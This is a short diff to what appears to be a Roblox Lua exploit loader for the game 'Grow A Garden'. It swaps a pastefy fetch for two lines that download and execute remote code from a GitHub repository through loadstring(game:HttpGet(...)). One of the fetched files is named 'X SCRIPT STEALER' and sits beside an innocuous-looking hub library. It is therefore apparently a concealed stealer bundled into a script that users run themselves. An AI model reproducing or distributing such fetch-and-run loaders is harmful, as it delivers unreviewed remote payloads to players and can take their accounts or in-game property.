@@ -1,1 +1,2 @@
-loadstring(game:HttpGet("https://pastefy.app/FSNiUtlU/raw"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KuniDevLua/GrowAGarden/refs/heads/main/kunihublibrary2"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KuniDevLua/GrowAGarden/refs/heads/main/X%20SCRIPT%20STEALER"))()
